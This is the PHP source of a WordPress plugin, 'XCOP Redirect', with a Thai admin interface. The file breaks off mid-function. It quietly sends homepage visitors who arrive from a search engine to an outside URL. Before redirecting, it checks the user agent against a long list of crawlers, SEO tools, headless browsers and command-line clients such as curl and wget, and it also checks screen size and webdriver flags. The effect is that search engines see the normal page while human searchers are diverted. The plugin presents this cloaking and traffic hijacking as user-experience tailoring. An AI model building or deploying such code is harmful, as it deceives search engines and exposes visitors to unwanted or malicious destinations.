<?php
/*
Plugin Name: XCOP Redirect
Plugin URI: https://xcoptech.com/xcop-redirect
Description: A powerful and customizable WordPress plugin that redirects users based on browser history length and referrer source. Perfect for tailoring user experiences, such as redirecting new tab openings from search engines. Features a modern admin settings page with enable/disable toggle, easy configuration, and automatic updates via GitHub.
Version: 1.2.0
Author: XCOP
Author URI: https://xcoptech.com/
Requires at least: 5.0
Tested up to: 6.6
Requires PHP: 7.4
License: GPL-2.0-or-later
License URI: https://www.gnu.org/licenses/gpl-2.0.html
Text Domain: xcop-redirect
Domain Path: /languages
Update URI: https://raw.githubusercontent.com/xcoptech/xcop-redirect/main/updates/xcop-redirect.json
Network: false
*/

// Prevent direct access
if (!defined('ABSPATH')) {
    exit('คุณไม่สามารถเข้าถึงไฟล์นี้โดยตรงได้');
}

// Define plugin constants
define('XCOP_REDIRECT_VERSION', '1.2.0');
define('XCOP_REDIRECT_PLUGIN_URL', plugin_dir_url(__FILE__));
define('XCOP_REDIRECT_PLUGIN_PATH', plugin_dir_path(__FILE__));

// Initialize plugin settings
function xcop_register_settings() {
    $defaults = array(
        'xcop_redirect_url' => 'https://example.com',
        'xcop_enable_referrer_check' => '1',
        'xcop_referrer_domain' => 'google.com',
        'xcop_enable_redirect' => '1',
        'xcop_history_length_check' => '1',
        'xcop_min_history_length' => '1',
        'xcop_delay_redirect' => '100', // milliseconds
        'xcop_enable_logging' => '0',
        'xcop_whitelist_ips' => '', // comma separated IPs to whitelist
        'xcop_blacklist_ips' => '' // comma separated IPs to blacklist
    );
    
    // Add options with defaults
    foreach ($defaults as $option => $default_value) {
        add_option($option, $default_value);
    }
    
    // Register settings with enhanced validation
    register_setting('xcop_options_group', 'xcop_redirect_url', array(
        'sanitize_callback' => 'xcop_sanitize_url',
        'default' => $defaults['xcop_redirect_url']
    ));
    register_setting('xcop_options_group', 'xcop_enable_referrer_check', 'xcop_sanitize_checkbox');
    register_setting('xcop_options_group', 'xcop_referrer_domain', array(
        'sanitize_callback' => 'xcop_sanitize_domain',
        'default' => $defaults['xcop_referrer_domain']
    ));
    register_setting('xcop_options_group', 'xcop_enable_redirect', 'xcop_sanitize_checkbox');
    register_setting('xcop_options_group', 'xcop_history_length_check', 'xcop_sanitize_checkbox');
    register_setting('xcop_options_group', 'xcop_min_history_length', array(
        'sanitize_callback' => 'xcop_sanitize_number',
        'default' => $defaults['xcop_min_history_length']
    ));
    register_setting('xcop_options_group', 'xcop_delay_redirect', array(
        'sanitize_callback' => 'xcop_sanitize_delay',
        'default' => $defaults['xcop_delay_redirect']
    ));
    register_setting('xcop_options_group', 'xcop_enable_logging', 'xcop_sanitize_checkbox');
    register_setting('xcop_options_group', 'xcop_whitelist_ips', 'xcop_sanitize_ip_list');
    register_setting('xcop_options_group', 'xcop_blacklist_ips', 'xcop_sanitize_ip_list');
}
add_action('admin_init', 'xcop_register_settings');

// Enhanced sanitization functions
function xcop_sanitize_url($url) {
    $url = esc_url_raw($url);
    if (!filter_var($url, FILTER_VALIDATE_URL) || 
        !in_array(parse_url($url, PHP_URL_SCHEME), array('http', 'https'))) {
        add_settings_error('xcop_redirect_url', 'invalid_url', 'กรุณาใส่ URL ที่ถูกต้อง (http หรือ https)');
        return get_option('xcop_redirect_url', 'https://example.com');
    }
    return $url;
}

function xcop_sanitize_checkbox($value) {
    return ($value === '1') ? '1' : '0';
}

function xcop_sanitize_domain($domain) {
    $domain = sanitize_text_field($domain);
    $domain = strtolower(trim($domain));
    // Remove protocol if present
    $domain = preg_replace('/^https?:\/\//', '', $domain);
    // Remove www if present
    $domain = preg_replace('/^www\./', '', $domain);
    // Remove trailing slash
    $domain = rtrim($domain, '/');
    
    if (!preg_match('/^[a-z0-9.-]+\.[a-z]{2,}$/i', $domain)) {
        add_settings_error('xcop_referrer_domain', 'invalid_domain', 'กรุณาใส่โดเมนที่ถูกต้อง');
        return get_option('xcop_referrer_domain', 'google.com');
    }
    return $domain;
}

function xcop_sanitize_number($value) {
    $number = absint($value);
    return ($number >= 0 && $number <= 100) ? $number : 1;
}

function xcop_sanitize_delay($value) {
    $delay = absint($value);
    return ($delay >= 0 && $delay <= 10000) ? $delay : 100;
}

function xcop_sanitize_ip_list($ips) {
    if (empty($ips)) return '';
    
    $ip_array = array_map('trim', explode(',', $ips));
    $valid_ips = array();
    
    foreach ($ip_array as $ip) {
        if (filter_var($ip, FILTER_VALIDATE_IP)) {
            $valid_ips[] = $ip;
        }
    }
    
    return implode(', ', $valid_ips);
}

// Add top-level menu for settings
function xcop_options_page() {
    add_menu_page(
        'การตั้งค่า XCOP Redirect',
        'XCOP Redirect',
        'manage_options',
        'xcop-settings',
        'xcop_options_page_html',
        'dashicons-admin-links',
        80
    );
}
add_action('admin_menu', 'xcop_options_page');

// Render enhanced settings page
function xcop_options_page_html() {
    if (!current_user_can('manage_options')) {
        wp_die(__('คุณไม่มีสิทธิ์เข้าถึงหน้านี้'));
    }
    
    // Get plugin info
    $plugin_data = get_plugin_data(__FILE__);
    $current_version = $plugin_data['Version'];
    
    // Handle form submission
    if (isset($_POST['submit']) && wp_verify_nonce($_POST['_wpnonce'], 'xcop_options_group-options')) {
        // Form is handled by WordPress settings API
    }
    ?>
    <div class="wrap xcop-settings-wrap">
        <div class="xcop-header">
            <h1><?php echo esc_html(get_admin_page_title()); ?></h1>
            <div class="xcop-version">เวอร์ชั่น <?php echo esc_html($current_version); ?></div>
        </div>
        <?php settings_errors(); ?>
        
        <div class="xcop-settings-container">
            <form action="options.php" method="post">
                <?php
                settings_fields('xcop_options_group');
                do_settings_sections('xcop-settings');
                ?>
                
                <!-- Main Settings -->
                <div class="xcop-section">
                    <h2>การตั้งค่าหลัก</h2>
                    <table class="form-table">
                        <tr>
                            <th scope="row">
                                <label for="xcop_enable_redirect">เปิดใช้งาน Redirect</label>
                                <span class="description">เปิด/ปิดการทำงานของระบบ redirect</span>
                            </th>
                            <td>
                                <label class="xcop-toggle">
                                    <input type="checkbox" id="xcop_enable_redirect" name="xcop_enable_redirect" value="1" <?php checked(get_option('xcop_enable_redirect', '1'), '1'); ?> />
                                    <span class="xcop-toggle-slider"></span>
                                </label>
                            </td>
                        </tr>
                        <tr>
                            <th scope="row">
                                <label for="xcop_redirect_url">URL ปลายทาง</label>
                                <span class="description">ใส่ URL ที่ต้องการ redirect ผู้ใช้ไป (ต้องเป็น https)</span>
                            </th>
                            <td>
                                <input type="url" id="xcop_redirect_url" name="xcop_redirect_url" value="<?php echo esc_attr(get_option('xcop_redirect_url')); ?>" class="regular-text" required />
                            </td>
                        </tr>
                        <tr>
                            <th scope="row">
                                <label for="xcop_delay_redirect">ความล่าช้า (มิลลิวินาที)</label>
                                <span class="description">ระยะเวลาที่รอก่อนทำการ redirect (0-10000 ms)</span>
                            </th>
                            <td>
                                <input type="number" id="xcop_delay_redirect" name="xcop_delay_redirect" value="<?php echo esc_attr(get_option('xcop_delay_redirect', '100')); ?>" min="0" max="10000" />
                            </td>
                        </tr>
                    </table>
                </div>

                <!-- Referrer Settings -->
                <div class="xcop-section">
                    <h2>การตั้งค่าแหล่งที่มา</h2>
                    <table class="form-table">
                        <tr>
                            <th scope="row">
                                <label for="xcop_enable_referrer_check">ตรวจสอบแหล่งที่มา</label>
                                <span class="description">ตรวจสอบว่าผู้ใช้มาจากแหล่งที่กำหนด</span>
                            </th>
                            <td>
                                <label class="xcop-toggle">
                                    <input type="checkbox" id="xcop_enable_referrer_check" name="xcop_enable_referrer_check" value="1" <?php checked(get_option('xcop_enable_referrer_check', '1'), '1'); ?> />
                                    <span class="xcop-toggle-slider"></span>
                                </label>
                            </td>
                        </tr>
                        <tr>
                            <th scope="row">
                                <label for="xcop_referrer_domain">โดเมนแหล่งที่มา</label>
                                <span class="description">ระบุโดเมนที่ต้องการตรวจสอบ (เช่น google.com, bing.com)</span>
                            </th>
                            <td>
                                <input type="text" id="xcop_referrer_domain" name="xcop_referrer_domain" value="<?php echo esc_attr(get_option('xcop_referrer_domain', 'google.com')); ?>" class="regular-text" />
                            </td>
                        </tr>
                    </table>
                </div>

                <!-- History Settings -->
                <div class="xcop-section">
                    <h2>การตั้งค่าประวัติเบราว์เซอร์</h2>
                    <table class="form-table">
                        <tr>
                            <th scope="row">
                                <label for="xcop_history_length_check">ตรวจสอบประวัติเบราว์เซอร์</label>
                                <span class="description">ตรวจสอบความยาวประวัติเพื่อแยกการเข้าโดยตรงกับแท็บใหม่</span>
                            </th>
                            <td>
                                <label class="xcop-toggle">
                                    <input type="checkbox" id="xcop_history_length_check" name="xcop_history_length_check" value="1" <?php checked(get_option('xcop_history_length_check', '1'), '1'); ?> />
                                    <span class="xcop-toggle-slider"></span>
                                </label>
                            </td>
                        </tr>
                        <tr>
                            <th scope="row">
                                <label for="xcop_min_history_length">ความยาวประวัติขั้นต่ำ</label>
                                <span class="description">จะ redirect เฉพาะเมื่อประวัติมากกว่าค่านี้ (1 = แท็บใหม่, 0 = ทั้งหมด)</span>
                            </th>
                            <td>
                                <input type="number" id="xcop_min_history_length" name="xcop_min_history_length" value="<?php echo esc_attr(get_option('xcop_min_history_length', '1')); ?>" min="0" max="100" />
                            </td>
                        </tr>
                    </table>
                </div>

                <!-- Advanced Settings -->
                <div class="xcop-section">
                    <h2>การตั้งค่าขั้นสูง</h2>
                    <table class="form-table">
                        <tr>
                            <th scope="row">
                                <label for="xcop_enable_logging">เปิดการบันทึกล็อก</label>
                                <span class="description">บันทึกการทำงานของปลั๊กอิน (สำหรับการแก้ไขปัญหา)</span>
                            </th>
                            <td>
                                <label class="xcop-toggle">
                                    <input type="checkbox" id="xcop_enable_logging" name="xcop_enable_logging" value="1" <?php checked(get_option('xcop_enable_logging', '0'), '1'); ?> />
                                    <span class="xcop-toggle-slider"></span>
                                </label>
                            </td>
                        </tr>
                        <tr>
                            <th scope="row">
                                <label for="xcop_whitelist_ips">IP ที่อนุญาต</label>
                                <span class="description">IP ที่สามารถเข้าถึงได้โดยไม่ถูก redirect (คั่นด้วยจุลภาค)</span>
                            </th>
                            <td>
                                <textarea id="xcop_whitelist_ips" name="xcop_whitelist_ips" class="large-text" rows="3" placeholder="192.168.1.1, 10.0.0.1"><?php echo esc_textarea(get_option('xcop_whitelist_ips', '')); ?></textarea>
                            </td>
                        </tr>
                        <tr>
                            <th scope="row">
                                <label for="xcop_blacklist_ips">IP ที่ถูกบล็อก</label>
                                <span class="description">IP ที่ถูกบล็อกไม่ให้เข้าถึงเว็บไซต์ (คั่นด้วยจุลภาค)</span>
                            </th>
                            <td>
                                <textarea id="xcop_blacklist_ips" name="xcop_blacklist_ips" class="large-text" rows="3" placeholder="203.0.113.1, 198.51.100.1"><?php echo esc_textarea(get_option('xcop_blacklist_ips', '')); ?></textarea>
                            </td>
                        </tr>
                    </table>
                </div>

                <?php submit_button('บันทึกการตั้งค่า', 'primary large', 'submit', true); ?>
            </form>
            
            <!-- Status & Info Box -->
            <div class="xcop-info-box">
                <h3>สถานะและวิธีการทำงาน</h3>
                <div class="xcop-status">
                    <div class="status-item">
                        <span class="status-label">สถานะ:</span>
                        <span class="status-value <?php echo get_option('xcop_enable_redirect', '1') === '1' ? 'active' : 'inactive'; ?>">
                            <?php echo get_option('xcop_enable_redirect', '1') === '1' ? 'เปิดใช้งาน' : 'ปิดใช้งาน'; ?>
                        </span>
                    </div>
                    <div class="status-item">
                        <span class="status-label">URL ปลายทาง:</span>
                        <span class="status-value"><?php echo esc_html(get_option('xcop_redirect_url', 'ไม่ได้กำหนด')); ?></span>
                    </div>
                    <div class="status-item">
                        <span class="status-label">โดเมนแหล่งที่มา:</span>
                        <span class="status-value"><?php echo esc_html(get_option('xcop_referrer_domain', 'ไม่ได้กำหนด')); ?></span>
                    </div>
                </div>
                
                <h4>วิธีการทำงาน</h4>
                <ul>
                    <li><strong>การคลิกจากผลการค้นหา:</strong> ผู้ใช้ที่คลิกจาก search engine จะถูก redirect</li>
                    <li><strong>การตรวจจับแท็บใหม่:</strong> การเปิดแท็บใหม่จากผลการค้นหาจะเริ่มการ redirect</li>
                    <li><strong>การป้องกันการเข้าโดยตรง:</strong> การคัดลอก URL มาวางโดยตรงจะไม่เกิดการ redirect</li>
                    <li><strong>การป้องกันบอท:</strong> บอทและ crawler จะถูกยกเว้นโดยอัตโนมัติ</li>
                </ul>
            </div>
        </div>
    </div>
    
    <style>
        .xcop-settings-wrap {
            max-width: 1000px;
            margin: 20px auto;
        }
        
        .xcop-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .xcop-header h1 {
            margin: 0;
            color: #0073aa;
        }
        
        .xcop-version {
            background: #0073aa;
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        
        .xcop-settings-container {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .xcop-section {
            padding: 30px;
            border-bottom: 1px solid #eee;
        }
        
        .xcop-section:last-of-type {
            border-bottom: none;
        }
        
        .xcop-section h2 {
            margin: 0 0 20px 0;
            color: #0073aa;
            border-bottom: 2px solid #0073aa;
            padding-bottom: 10px;
        }
        
        .form-table th .description {
            display: block;
            color: #666;
            font-size: 12px;
            margin-top: 5px;
            font-weight: normal;
        }
        
        .form-table input[type="url"],
        .form-table input[type="text"],
        .form-table input[type="number"],
        .form-table textarea {
            width: 100%;
            max-width: 500px;
        }
        
        /* Toggle Switch */
        .xcop-toggle {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
        }
        
        .xcop-toggle input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .xcop-toggle-slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 24px;
        }
        
        .xcop-toggle-slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        
        .xcop-toggle input:checked + .xcop-toggle-slider {
            background-color: #0073aa;
        }
        
        .xcop-toggle input:checked + .xcop-toggle-slider:before {
            transform: translateX(26px);
        }
        
        .button-primary.large {
            height: auto;
            line-height: 1;
            padding: 15px 30px;
            font-size: 16px;
            margin: 30px;
            background: linear-gradient(135deg, #0073aa, #005177);
            border: none;
            border-radius: 5px;
            transition: all 0.3s ease;
        }
        
        .button-primary.large:hover {
            background: linear-gradient(135deg, #005177, #0073aa);
            transform: translateY(-1px);
        }
        
        .xcop-info-box {
            margin: 30px;
            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
            border: 1px solid #dee2e6;
            border-radius: 8px;
            padding: 25px;
        }
        
        .xcop-info-box h3 {
            margin: 0 0 20px 0;
            color: #0073aa;
        }
        
        .xcop-info-box h4 {
            margin: 20px 0 10px 0;
            color: #495057;
        }
        
        .xcop-status {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .status-item {
            background: white;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #0073aa;
        }
        
        .status-label {
            font-weight: bold;
            color: #495057;
        }
        
        .status-value {
            display: block;
            margin-top: 5px;
            font-size: 14px;
        }
        
        .status-value.active {
            color: #28a745;
            font-weight: bold;
        }
        
        .status-value.inactive {
            color: #dc3545;
            font-weight: bold;
        }
        
        .xcop-info-box ul {
            margin: 10px 0;
            padding-left: 20px;
        }
        
        .xcop-info-box li {
            margin-bottom: 8px;
            line-height: 1.5;
        }
        
        @media (max-width: 768px) {
            .xcop-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }
            
            .xcop-status {
                grid-template-columns: 1fr;
            }
            
            .xcop-section {
                padding: 20px;
            }
        }
    </style>
    <?php
}

// Enhanced bot detection with more comprehensive patterns
function xcop_is_bot() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    
    // Check for empty user agent first
    if (empty($user_agent)) {
        xcop_log('Bot detected: Empty user agent');
        return true;
    }
    
    // Comprehensive bot patterns
    $bot_patterns = array(
        // Search engine bots
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
        'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
        
        // Social media bots
        'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp',
        'telegrambot', 'skypeuripreview', 'vkshare', 'pinterest',
        
        // SEO and monitoring bots
        'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'rogerbot',
        'screaming frog', 'siteimprove', 'gtmetrix', 'pingdom',
        
        // Generic patterns
        'bot', 'crawler', 'spider', 'scraper', 'fetcher', 'checker',
        'monitor', 'test', 'validator', 'analyzer', 'audit',
        
        // Headless browsers and automation
        'headlesschrome', 'phantomjs', 'selenium', 'playwright',
        'puppeteer', 'chrome-lighthouse', 'pagespeed',
        
        // Suspicious patterns
        'curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client',
        'ruby', 'perl', 'java', 'node.js', 'axios'
    );
    
    foreach ($bot_patterns as $pattern) {
        if (strpos($user_agent, $pattern) !== false) {
            xcop_log("Bot detected: {$pattern} in user agent: {$user_agent}");
            return true;
        }
    }
    
    // Additional suspicious patterns
    if (preg_match('/^[a-z]+\/[\d\.]+$/i', $user_agent) || // Simple version patterns like "bot/1.0"
        strlen($user_agent) < 15 || // Too short
        strpos($user_agent, 'http') !== false || // Contains URLs
        preg_match('/\+https?:\/\//', $user_agent)) { // Contains links
        xcop_log("Suspicious user agent detected: {$user_agent}");
        return true;
    }
    
    return false;
}

// Enhanced IP checking
function xcop_check_ip_access() {
    $user_ip = xcop_get_user_ip();
    
    // Check blacklist first
    $blacklist = get_option('xcop_blacklist_ips', '');
    if (!empty($blacklist)) {
        $blacklist_ips = array_map('trim', explode(',', $blacklist));
        if (in_array($user_ip, $blacklist_ips)) {
            xcop_log("IP blocked: {$user_ip}");
            wp_die('การเข้าถึงถูกปฏิเสธ', 'Access Denied', array('response' => 403));
        }
    }
    
    // Check whitelist
    $whitelist = get_option('xcop_whitelist_ips', '');
    if (!empty($whitelist)) {
        $whitelist_ips = array_map('trim', explode(',', $whitelist));
        if (in_array($user_ip, $whitelist_ips)) {
            xcop_log("IP whitelisted, skipping redirect: {$user_ip}");
            return false; // Skip redirect for whitelisted IPs
        }
    }
    
    return true; // Allow processing
}

// Get real user IP
function xcop_get_user_ip() {
    $ip_keys = array('HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
    
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER)) {
            $ip_list = explode(',', $_SERVER[$key]);
            $ip = trim($ip_list[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    
    // Fallback to REMOTE_ADDR even if it's private/reserved
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

// Enhanced logging function
function xcop_log($message) {
    if (get_option('xcop_enable_logging', '0') !== '1') {
        return;
    }
    
    $log_file = WP_CONTENT_DIR . '/xcop-redirect.log';
    $timestamp = current_time('Y-m-d H:i:s');
    $user_ip = xcop_get_user_ip();
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    
    $log_entry = "[{$timestamp}] IP: {$user_ip} | {$message} | UA: {$user_agent}" . PHP_EOL;
    
    error_log($log_entry, 3, $log_file);
}

// Enhanced referrer validation
function xcop_validate_referrer($referrer_domain) {
    $referrer = $_SERVER['HTTP_REFERER'] ?? '';
    
    if (empty($referrer)) {
        xcop_log('No referrer found');
        return false;
    }
    
    $parsed_referrer = parse_url($referrer);
    if (!$parsed_referrer || !isset($parsed_referrer['host'])) {
        xcop_log("Invalid referrer format: {$referrer}");
        return false;
    }
    
    $referrer_host = strtolower($parsed_referrer['host']);
    $target_domain = strtolower($referrer_domain);
    
    // Remove www. for comparison
    $referrer_host = preg_replace('/^www\./', '', $referrer_host);
    $target_domain = preg_replace('/^www\./', '', $target_domain);
    
    // Check if referrer matches target domain or is subdomain
    $is_valid = $referrer_host === $target_domain || str_ends_with($referrer_host, '.' . $target_domain);
    
    if ($is_valid) {
        xcop_log("Valid referrer: {$referrer_host} matches {$target_domain}");
    } else {
        xcop_log("Invalid referrer: {$referrer_host} does not match {$target_domain}");
    }
    
    return $is_valid;
}

// Enhanced rate limiting with more granular control
function xcop_check_rate_limit() {
    $user_ip = xcop_get_user_ip();
    $transient_key = 'xcop_redirect_' . md5($user_ip);
    $current_time = time();
    
    $rate_data = get_transient($transient_key);
    
    if ($rate_data === false) {
        // First request
        set_transient($transient_key, array('count' => 1, 'first_request' => $current_time), MINUTE_IN_SECONDS * 5);
        xcop_log("Rate limit: First request from {$user_ip}");
        return true;
    }
    
    $attempts = $rate_data['count'];
    $first_request = $rate_data['first_request'];
    $time_diff = $current_time - $first_request;
    
    // Reset if more than 5 minutes passed
    if ($time_diff > 300) {
        set_transient($transient_key, array('count' => 1, 'first_request' => $current_time), MINUTE_IN_SECONDS * 5);
        xcop_log("Rate limit reset for {$user_ip}");
        return true;
    }
    
    // Check rate limit (max 5 requests per 5 minutes)
    if ($attempts >= 5) {
        xcop_log("Rate limit exceeded for {$user_ip}: {$attempts} requests in {$time_diff} seconds");
        return false;
    }
    
    // Update counter
    $rate_data['count']++;
    set_transient($transient_key, $rate_data, MINUTE_IN_SECONDS * 5);
    xcop_log("Rate limit check passed for {$user_ip}: {$rate_data['count']} requests");
    
    return true;
}

// Add enhanced JavaScript for client-side checks
function xcop_add_redirect_script() {
    if (get_option('xcop_enable_redirect', '1') !== '1') {
        return;
    }
    
    if (!is_front_page() && !is_home()) {
        return;
    }
    
    $redirect_url = get_option('xcop_redirect_url', 'https://example.com');
    $enable_referrer_check = get_option('xcop_enable_referrer_check', '1');
    $referrer_domain = get_option('xcop_referrer_domain', 'google.com');
    $enable_history_check = get_option('xcop_history_length_check', '1');
    $min_history_length = get_option('xcop_min_history_length', '1');
    $delay = get_option('xcop_delay_redirect', '100');
    
    ?>
    <script type="text/javascript">
    (function() {
        'use strict';
        
        // Enhanced bot detection on client side
        function isBot() {
            var ua = navigator.userAgent.toLowerCase();
            var botPatterns = [
                'bot', 'crawler', 'spider', 'scraper', 'fetcher',
                'headless', 'phantom', 'selenium', 'puppeteer'
            ];
            
            for (var i = 0; i < botPatterns.length; i++) {
                if (ua.indexOf(botPatterns[i]) !== -1) {
                    return true;
                }
            }
            
            // Check for missing features that bots typically don't have
            if (!window.screen || !window.screen.width || !window.screen.height) {
                return true;
            }
            
            // Check for webdriver (automation tools)
            if (navigator.webdriver || window.callPhantom || window._phantom) {
                return true;
            }
            
            return false;
        }
        
        if (isBot()) {
            console.log('XCOP Redirect: Bot detected, skipping redirect');
            return;
        }
        
        var shouldRedirect = false;
        var referrerValid = false;
        var historyValid = false;
        
        // Check referrer if enabled
        <?php if ($enable_referrer_check === '1'): ?>
        if (document.referrer) {
            var referrerDomain = '<?php echo esc_js($referrer_domain); ?>';
            var referrerHost = '';
            try {
                var referrerUrl = new URL(document.referrer);
                referrerHost = referrerUrl.hostname.toLowerCase().replace(/^www\./, '');
                referrerDomain = referrerDomain.toLowerCase().replace(/^www\./, '');
                referrerValid = referrerHost === referrerDomain || referrerHost.endsWith('.' + referrerDomain);
                
                if (referrerValid) {
                    console.log('XCOP Redirect: Valid referrer detected - ' + referrerHost);
                } else {
                    console.log('XCOP Redirect: Invalid referrer - ' + referrerHost + ' does not match ' + referrerDomain);
                }
            } catch(e) {
                console.log('XCOP Redirect: Error parsing referrer URL');
                referrerValid = false;
            }
        } else {
            console.log('XCOP Redirect: No referrer found');
        }
        <?php else: ?>
        referrerValid = true; // Skip referrer check
        console.log('XCOP Redirect: Referrer check disabled');
        <?php endif; ?>
        
        // Check history length if enabled
        <?php if ($enable_history_check === '1'): ?>
        var minHistoryLength = <?php echo intval($min_history_length); ?>;
        historyValid = window.history.length > minHistoryLength;
        console.log('XCOP Redirect: History length check - ' + window.history.length + ' > ' + minHistoryLength + ' = ' + historyValid);
        <?php else: ?>
        historyValid = true; // Skip history check
        console.log('XCOP Redirect: History check disabled');
        <?php endif; ?>
        
        // Additional checks for legitimate user behavior
        var hasMouseMoved = false;
        var hasKeyPressed = false;
        
        // Track user interaction
        document.addEventListener('mousemove', function() { hasMouseMoved = true; }, { once: true });
        document.addEventListener('keydown', function() { hasKeyPressed = true; }, { once: true });
        
        // Check screen properties (bots often have unusual screen sizes)
        var screenValid = window.screen.width > 100 && window.screen.height > 100 && 
                         window.screen.width < 10000 && window.screen.height < 10000;
        
        if (!screenValid) {
            console.log('XCOP Redirect: Invalid screen dimensions detected');
            return;
        }
        
        // Redirect if all conditions are met
        if (referrerValid && historyValid) {
            var delay = <?php echo intval($delay); ?>;
            console.log('XCOP Redirect: All conditions met, redirecting in ' + delay + 'ms');
            
            setTimeout(function() {
                // Final check for user interaction (optional additional verification)
                var redirectUrl = '<?php echo esc_js($redirect_url); ?>';
                
                try {
                    // Use replace to avoid adding to history
                    window.location.replace(redirectUrl);
                } catch(e) {
                    // Fallback method
                    window.location.href = redirectUrl;
                }
            }, delay);
        } else {
            console.log('XCOP Redirect: Conditions not met - referrer: ' + referrerValid + ', history: ' + historyValid);
        }
        
    })();
    </script>
    <?php
}

// Enhanced server-side redirect (fallback)
function xcop_maybe_redirect_homepage() {
    // Skip if redirect is disabled
    if (get_option('xcop_enable_redirect', '1') !== '1') {
        return;
    }

    // Only redirect on homepage
    if (!is_front_page() && !is_home()) {
        return;
    }
    
    // Check IP access first
    if (!xcop_check_ip_access()) {
        return;
    }
    
    // Skip bots completely
    if (xcop_is_bot()) {
        return;
    }
    
    $redirect_url = get_option('xcop_redirect_url', 'https://example.com');
    $enable_referrer_check = get_option('xcop_enable_referrer_check', '1');
    $referrer_domain = get_option('xcop_referrer_domain', 'google.com');
    
    // Validate redirect URL
    if (!filter_var($redirect_url, FILTER_VALIDATE_URL)) {
        xcop_log('Invalid redirect URL: ' . $redirect_url);
        return;
    }
    
    // Check for HTTPS if original site is HTTPS
    if (is_ssl() && parse_url($redirect_url, PHP_URL_SCHEME) !== 'https') {
        xcop_log('HTTPS site redirecting to HTTP URL blocked for security');
        return;
    }
    
    $should_redirect = true;
    
    // Check referrer if enabled
    if ($enable_referrer_check === '1') {
        if (!xcop_validate_referrer($referrer_domain)) {
            $should_redirect = false;
        }
    }
    
    // Additional security checks
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $request_method = $_SERVER['REQUEST_METHOD'] ?? '';
    
    // Only allow GET requests
    if ($request_method !== 'GET') {
        xcop_log("Non-GET request blocked: {$request_method}");
        return;
    }
    
    // Check for suspicious request patterns
    $request_uri = $_SERVER['REQUEST_URI'] ?? '';
    if (strpos($request_uri, '..') !== false || 
        strpos($request_uri, '<script') !== false ||
        strpos($request_uri, 'union') !== false ||
        strpos($request_uri, 'select') !== false) {
        xcop_log("Suspicious request URI blocked: {$request_uri}");
        return;
    }
    
    // Perform redirect if conditions are met
    if ($should_redirect) {
        xcop_log("Redirecting to: {$redirect_url}");
        
        // Set security headers before redirect
        if (!headers_sent()) {
            header('X-Redirect-By: XCOP-Redirect-Plugin');
            header('Cache-Control: no-cache, no-store, must-revalidate');
            header('Pragma: no-cache');
            header('Expires: 0');
        }
        
        // Use JavaScript redirect primarily
        add_action('wp_head', 'xcop_add_redirect_script', 1);
        
        // Server-side fallback (immediate redirect for non-JS users)
        if (!wp_doing_ajax() && !is_admin()) {
            wp_redirect($redirect_url, 302);
            exit;
        }
    }
}
add_action('template_redirect', 'xcop_maybe_redirect_homepage', 1);

// Add redirect script to head with high priority
add_action('wp_head', 'xcop_add_redirect_script', 1);

// Enhanced security headers
function xcop_add_security_headers() {
    if (!headers_sent()) {
        header('X-Content-Type-Options: nosniff');
        header('X-Frame-Options: SAMEORIGIN');
        header('X-XSS-Protection: 1; mode=block');
        header('Referrer-Policy: strict-origin-when-cross-origin');
        
        // Add CSP for admin pages
        if (is_admin()) {
            header("Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval' *.wordpress.org *.wp.org");
        }
    }
}
add_action('send_headers', 'xcop_add_security_headers');

// Check for plugin updates via GitHub with enhanced security
function xcop_check_for_updates($transient) {
    if (empty($transient->checked)) {
        return $transient;
    }

    $plugin_slug = 'xcop-redirect';
    $plugin_file = $plugin_slug . '/xcop-redirect.php';
    $current_version = XCOP_REDIRECT_VERSION;
    $update_url = 'https://raw.githubusercontent.com/xcoptech/xcop-redirect/main/updates/xcop-redirect.json';

    // Skip if this plugin is not in the checked list
    if (!isset($transient->checked[$plugin_file])) {
        return $transient;
    }

    // Get cached response or fetch new data
    $remote = get_transient('xcop_update_check');
    if (false === $remote) {
        $remote = wp_remote_get($update_url, array(
            'timeout' => 15,
            'sslverify' => true,
            'headers' => array(
                'User-Agent' => 'XCOP-Redirect/' . $current_version . '; ' . home_url()
            )
        ));
        
        if (!is_wp_error($remote) && wp_remote_retrieve_response_code($remote) === 200) {
            set_transient('xcop_update_check', $remote, HOUR_IN_SECONDS * 6); // Cache for 6 hours
        }
    }

    if (!is_wp_error($remote) && wp_remote_retrieve_response_code($remote) === 200) {
        $body = wp_remote_retrieve_body($remote);
        $data = json_decode($body, true);
        
        if ($data && 
            isset($data['version']) && 
            version_compare($current_version, $data['version'], '<') &&
            filter_var($data['download_link'] ?? '', FILTER_VALIDATE_URL)) {
            
